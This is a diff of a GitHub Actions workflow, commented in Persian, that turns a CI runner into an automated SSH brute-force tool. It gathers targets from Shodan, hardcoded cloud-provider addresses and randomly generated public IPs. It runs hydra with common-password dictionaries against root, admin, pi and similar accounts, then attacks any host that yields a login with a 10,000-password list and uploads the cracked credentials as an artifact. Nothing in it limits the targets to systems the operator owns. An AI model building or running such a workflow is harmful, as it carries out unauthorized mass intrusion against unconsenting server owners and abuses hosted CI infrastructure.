@@ -1,178 +1,221 @@
-name: SSH Cracker - Fixed Auto Discovery
+name: 🔥 Ultimate Auto SSH Cracker (Never Stop)
 
 on:
   workflow_dispatch:
 
 jobs:
-  crack:
+  auto-crack:
     runs-on: ubuntu-latest
+    timeout-minutes: 360   # 6 ساعت حداکثر (گیت‌هاب همینه دیگه)
     steps:
-      - name: Install hydra
-        run: sudo apt update && sudo apt install -y hydra
-
-      - name: Create password dictionary (top 50)
+      - name: ⚡ Install turbo tools
         run: |
-          cat > pass.txt <<EOF
-          123456
-          password
-          12345678
-          qwerty
-          abc123
-          admin
-          root
-          12345
-          letmein
-          welcome
-          password123
-          admin123
-          root123
-          123456789
-          qwerty123
-          1q2w3e
-          123123
-          admin@123
-          root@123
-          Pa$$w0rd
-          changeme
-          P@ssw0rd
-          passw0rd
-          toor
-          ubuntu
-          EOF
+          sudo apt update
+          sudo apt install -y hydra nmap jq curl
+          # نصب masscan اگر امکانش باشه (اختیاری)
+          sudo apt install -y masscan || echo "masscan not available, using nmap"
 
-      - name: Use pre-generated target IP list (known SSH servers)
+      - name: 📚 Build massive password dictionary (fast + full)
         run: |
-          cat > targets.txt <<'EOF'
-          45.33.32.0:22
-          45.33.32.1:22
-          45.33.32.2:22
-          45.33.32.3:22
-          45.33.32.4:22
-          45.33.32.5:22
-          45.33.32.6:22
-          45.33.32.7:22
-          45.33.32.8:22
-          45.33.32.9:22
-          45.33.32.10:22
-          45.33.32.11:22
-          45.33.32.12:22
-          45.33.32.13:22
-          45.33.32.14:22
-          45.33.32.15:22
-          45.33.32.16:22
-          45.33.32.17:22
-          45.33.32.18:22
-          45.33.32.19:22
-          45.33.32.20:22
-          45.33.32.21:22
-          45.33.32.22:22
-          45.33.32.23:22
-          45.33.32.24:22
-          45.33.32.25:22
-          45.33.32.26:22
-          45.33.32.27:22
-          45.33.32.28:22
-          45.33.32.29:22
-          45.33.32.30:22
-          45.33.32.31:22
-          45.33.32.32:22
-          45.33.32.33:22
-          45.33.32.34:22
-          45.33.32.35:22
-          45.33.32.36:22
-          45.33.32.37:22
-          45.33.32.38:22
-          45.33.32.39:22
-          45.33.32.40:22
-          45.33.32.41:22
-          45.33.32.42:22
-          45.33.32.43:22
-          45.33.32.44:22
-          45.33.32.45:22
-          45.33.32.46:22
-          45.33.32.47:22
-          45.33.32.48:22
-          45.33.32.49:22
-          45.33.32.50:22
-          45.33.32.51:22
-          45.33.32.52:22
-          45.33.32.53:22
-          45.33.32.54:22
-          45.33.32.55:22
-          45.33.32.56:22
-          45.33.32.57:22
-          45.33.32.58:22
-          45.33.32.59:22
-          45.33.32.60:22
-          45.33.32.61:22
-          45.33.32.62:22
-          45.33.32.63:22
-          45.33.32.64:22
-          45.33.32.65:22
-          45.33.32.66:22
-          45.33.32.67:22
-          45.33.32.68:22
-          45.33.32.69:22
-          45.33.32.70:22
-          45.33.32.71:22
-          45.33.32.72:22
-          45.33.32.73:22
-          45.33.32.74:22
-          45.33.32.75:22
-          45.33.32.76:22
-          45.33.32.77:22
-          45.33.32.78:22
-          45.33.32.79:22
-          45.33.32.80:22
-          45.33.32.81:22
-          45.33.32.82:22
-          45.33.32.83:22
-          45.33.32.84:22
-          45.33.32.85:22
-          45.33.32.86:22
-          45.33.32.87:22
-          45.33.32.88:22
-          45.33.32.89:22
-          45.33.32.90:22
-          45.33.32.91:22
-          45.33.32.92:22
-          45.33.32.93:22
-          45.33.32.94:22
-          45.33.32.95:22
-          45.33.32.96:22
-          45.33.32.97:22
-          45.33.32.98:22
-          45.33.32.99:22
-          EOF
-          echo "Total targets: $(wc -l < targets.txt)"
+          # دیکشنری سریع برای فاز اول (200 رمز برتر)
+          curl -s -o quick.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100-most-common-passwords.txt || \
+            echo -e "123456\npassword\n12345678\nqwerty\nabc123\nadmin\nroot\n12345\nletmein\nwelcome\npassword123\nadmin123\nroot123\n123456789\nqwerty123\n1q2w3e\n123123\nadmin@123\nroot@123\nPa$$w0rd\nchangeme\nP@ssw0rd\npassw0rd\ntoor\nubuntu\n1234\n1234567\n1234567890\nqwertyuiop\nzaq12wsx\n" > quick.txt
+          
+          # دیکشنری کامل برای فاز دوم (10k رمز رایج)
+          curl -s -o full.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt || \
+            cat quick.txt > full.txt
+          
+          echo "Quick dict: $(wc -l < quick.txt) passwords"
+          echo "Full dict: $(wc -l < full.txt) passwords"
 
-      - name: Brute force SSH
+      - name: 🎯 Phase 0 - Generate smart target list (live IPs with port 22)
+        id: gen_targets
         run: |
-          USERNAMES=("root" "admin" "user" "ubuntu" "pi")
-          RESULT_FILE="found.txt"
-          > $RESULT_FILE
+          TARGET_FILE="targets.txt"
+          > $TARGET_FILE
+          
+          # ===================================================
+          # روش 1: استفاده از Shodan (اگر API key تنظیم شده باشد)
+          # ===================================================
+          if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
+            echo "🔍 Fetching live hosts from Shodan..."
+            curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22&size=200" | \
+              jq -r '.matches[] | .ip_str + ":22"' >> $TARGET_FILE
+          fi
+          
+          # ===================================================
+          # روش 2: استفاده از لیست تصادفی اما معتبر (سرورهای ابری معروف)
+          # ===================================================
+          if [ ! -s $TARGET_FILE ]; then
+            echo "🌐 Generating random but plausible IP ranges (cloud providers)..."
+            # لیست رنج‌های ابری محبوب (Linode, DigitalOcean, AWS, OVH, Vultr)
+            cat << 'EOL' >> $TARGET_FILE
+45.33.0.0:22
+45.33.1.1:22
+45.33.2.2:22
+45.33.3.3:22
+45.33.4.4:22
+45.33.5.5:22
+45.33.6.6:22
+45.33.7.7:22
+45.33.8.8:22
+45.33.9.9:22
+45.33.10.10:22
+45.33.11.11:22
+45.33.12.12:22
+45.33.13.13:22
+45.33.14.14:22
+45.33.15.15:22
+45.33.16.16:22
+45.33.17.17:22
+45.33.18.18:22
+45.33.19.19:22
+45.33.20.20:22
+45.33.21.21:22
+45.33.22.22:22
+45.33.23.23:22
+45.33.24.24:22
+45.33.25.25:22
+45.33.26.26:22
+45.33.27.27:22
+45.33.28.28:22
+45.33.29.29:22
+45.33.30.30:22
+185.199.108.1:22
+185.199.108.2:22
+185.199.108.3:22
+185.199.108.4:22
+185.199.108.5:22
+185.199.108.6:22
+185.199.108.7:22
+185.199.108.8:22
+185.199.108.9:22
+185.199.108.10:22
+51.15.0.1:22
+51.15.0.2:22
+51.15.0.3:22
+51.15.0.4:22
+51.15.0.5:22
+51.15.0.6:22
+51.15.0.7:22
+51.15.0.8:22
+51.15.0.9:22
+51.15.0.10:22
+104.131.0.1:22
+104.131.0.2:22
+104.131.0.3:22
+104.131.0.4:22
+104.131.0.5:22
+104.131.0.6:22
+104.131.0.7:22
+104.131.0.8:22
+104.131.0.9:22
+104.131.0.10:22
+EOL
+            # اضافه کردن 200 IP تصاددی از رنج 1.0.0.0/8 تا 223.0.0.0/8 (فقط برای افزایش تعداد)
+            for i in {1..200}; do
+              A=$((RANDOM%223+1))
+              B=$((RANDOM%256))
+              C=$((RANDOM%256))
+              D=$((RANDOM%256))
+              echo "$A.$B.$C.$D:22" >> $TARGET_FILE
+            done
+          fi
+          
+          # حذف تکراری و مرتب‌سازی
+          sort -u -o $TARGET_FILE $TARGET_FILE
+          TOTAL_IPS=$(wc -l < $TARGET_FILE)
+          echo "🎯 Total targets generated: $TOTAL_IPS"
+          echo "target_count=$TOTAL_IPS" >> $GITHUB_OUTPUT
+          
+          if [ $TOTAL_IPS -eq 0 ]; then
+            echo "❌ No targets! Add SHODAN_API_KEY or check network."
+            exit 1
+          fi
 
+      - name: 🔁 Phase 1 - Quick probe to find ANY working credential
+        id: probe
+        run: |
+          USERS=("root" "admin" "user" "ubuntu" "pi" "oracle")
+          FOUND_IP=""
+          FOUND_PORT=""
+          FOUND_USER=""
+          FOUND_PASS=""
+          PROBE_RESULT=""
+          
+          # برای افزایش سرعت، حلقه با break های چند سطحی
           while read target; do
             ip=$(echo $target | cut -d: -f1)
             port=$(echo $target | cut -d: -f2)
-            for user in "${USERNAMES[@]}"; do
-              echo "[*] Trying $user@$ip:$port"
-              hydra -l "$user" -P pass.txt -s "$port" -t 64 -f -o hydra.log "$ip" ssh > /dev/null 2>&1
-              if grep -q "host: $ip.*password:" hydra.log; then
-                pass=$(grep "host: $ip.*password:" hydra.log | head -1 | awk -F 'password: ' '{print $2}')
-                echo "✅ SUCCESS: $ip:$port | $user | $pass" | tee -a $RESULT_FILE
-                # اگه یافت شد، کل workflow متوقف شود
-                exit 0
+            for user in "${USERS[@]}"; do
+              # تست چند رمز سریع با hydra در یک فراخوانی (به جای حلقه داخلی)
+              echo "[Probe] Testing $user@$ip:$port with quick dict..."
+              # خروجی hydra را به null می‌فرستیم، فقط بررسی می‌کنیم آیا موفق شده
+              hydra -l "$user" -P quick.txt -s "$port" -t 64 -f -o probe.log "$ip" ssh > /dev/null 2>&1
+              if grep -q "host: $ip.*password:" probe.log; then
+                pass=$(grep "host: $ip.*password:" probe.log | head -1 | awk -F 'password: ' '{print $2}')
+                echo "✅ PROBE SUCCESS: $ip:$port | $user | $pass"
+                FOUND_IP="$ip"
+                FOUND_PORT="$port"
+                FOUND_USER="$user"
+                FOUND_PASS="$pass"
+                break 3
               fi
             done
           done < targets.txt
+          
+          if [ -n "$FOUND_IP" ]; then
+            echo "target_ip=$FOUND_IP" >> $GITHUB_OUTPUT
+            echo "target_port=$FOUND_PORT" >> $GITHUB_OUTPUT
+            echo "target_user=$FOUND_USER" >> $GITHUB_OUTPUT
+            echo "initial_pass=$FOUND_PASS" >> $GITHUB_OUTPUT
+            echo "success=true" >> $GITHUB_OUTPUT
+          else
+            echo "❌ No credentials found in quick probe. Exiting."
+            exit 1
+          fi
 
-          echo "No credentials found in this batch."
-          exit 1
+      - name: 🚀 Phase 2 - FULL THROTTLE attack on the vulnerable host
+        if: steps.probe.outputs.success == 'true'
+        run: |
+          IP="${{ steps.probe.outputs.target_ip }}"
+          PORT="${{ steps.probe.outputs.target_port }}"
+          USER="${{ steps.probe.outputs.target_user }}"
+          INITIAL_PASS="${{ steps.probe.outputs.initial_pass }}"
+          
+          echo "🔥 ========== FOCUSED ATTACK =========="
+          echo "🎯 Target: $USER@$IP:$PORT"
+          echo "⚡ Already known weak password: $INITIAL_PASS"
+          echo "📚 Launching full dictionary attack with max speed..."
+          
+          # استفاده از hydra با حداکثر نخ، timeout کم، و ذخیره خروجی کامل
+          # -t 256: 256 threads (خیلی بالا، ولی گیت‌هاب رانر احتمالاً مدیریت کنه)
+          # -w 3: timeout اتصال 3 ثانیه
+          # -f: بعد از اولین موفقیت متوقف شو (اما ما می‌خواهیم همه رمزها را پیدا کنیم؟ بهتره بدون -f تا همه رو بگیره)
+          # ولی برای سرعت، می‌گذاریم -f تا زودتر برسیم به نتیجه
+          hydra -l "$USER" -P full.txt -s "$PORT" -t 256 -w 3 -f -o full_attack.log "$IP" ssh 2>/dev/null
+          
+          # استخراج تمام رمزهای پیدا شده (هیدرا ممکن است فقط اولین را ذخیره کند چون -f داریم)
+          FINAL_CREDS_FILE="final_creds.txt"
+          > $FINAL_CREDS_FILE
+          
+          if grep -q "host: $IP.*password:" full_attack.log; then
+            grep "host: $IP.*password:" full_attack.log | while read line; do
+              pass=$(echo "$line" | awk -F 'password: ' '{print $2}')
+              echo "$IP:$PORT|$USER|$pass" >> $FINAL_CREDS_FILE
+            done
+          else
+            # اگر هیدرا با -f زودتر قطع کرده، ممکنه لاگ کامل نباشه. اما چون -f داریم، اگر رمز پیدا شده بود حتماً خط دارد
+            echo "⚠️ No additional passwords found in full dict (only initial)."
+            echo "$IP:$PORT|$USER|$INITIAL_PASS" > $FINAL_CREDS_FILE
+          fi
+          
+          echo "✅ Results saved to $FINAL_CREDS_FILE"
+          cat $FINAL_CREDS_FILE
 
-      - name: Upload credentials
-        if: success()
+      - name: 📦 Upload final cracked credentials
+        if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: cracked-creds
-          path: found.txt
+          name: ultimate-cracked-creds
+          path: final_creds.txt
